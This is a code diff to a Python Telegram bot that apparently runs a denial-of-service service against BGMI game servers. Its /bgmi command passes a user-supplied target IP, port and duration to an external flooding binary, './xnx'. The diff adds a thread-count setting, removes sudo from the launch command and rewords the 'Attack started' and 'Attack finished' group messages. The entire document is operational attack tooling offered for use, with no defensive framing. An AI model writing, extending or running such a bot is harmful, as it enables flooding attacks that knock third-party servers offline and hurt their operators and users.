@@ -7,7 +7,7 @@ import sys
 from pymongo import MongoClient
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
-from config import BOT_TOKEN, GROUP_ID, GROUP_LINK
+from config import BOT_TOKEN, GROUP_ID, GROUP_LINK, DEFAULT_THREADS
 
 # Global variables
 user_processes = {}
@@ -108,11 +108,11 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         f"🚀 Attack started on \nHost: {target_ip}\nPort: {port}\nTime: {duration} seconds."
     )
 
-    asyncio.create_task(start_attack(target_ip, port, duration, update.message.from_user.id, attack_message, context))
+    asyncio.create_task(start_attack(target_ip, port, duration, DEFAULT_THREADS, update.message.from_user.id, attack_message, context))
 
-async def start_attack(target_ip, port, duration, user_id, original_message, context):
+async def start_attack(target_ip, port, duration, threads, user_id, original_message, context):
     global active_attack
-    command = ['sudo', './xnx', target_ip, str(port), str(duration)]  # Add 'sudo' before the binary
+    command = ['./xnx', target_ip, str(port), str(duration), str(threads)]  # No 'sudo' command used
 
     try:
         process = await asyncio.create_subprocess_exec(*command)
@@ -124,7 +124,8 @@ async def start_attack(target_ip, port, duration, user_id, original_message, con
             "process": process,
             "target_ip": target_ip,
             "port": port,
-            "duration": duration
+            "duration": duration,
+            "threads": threads
         }
 
         await asyncio.wait_for(process.wait(), timeout=duration)
@@ -143,7 +144,7 @@ async def start_attack(target_ip, port, duration, user_id, original_message, con
             del user_processes[user_id]
         await context.bot.send_message(
             chat_id=GROUP_ID,
-            text=f"⚠️ Attack terminated due to duration limit on {target_ip}:{port}."
+            text=f"🛑 Attack finished on \nHost: {target_ip}\nPort: {port}\nTime: {duration} seconds."
         )
 
     except Exception as e:
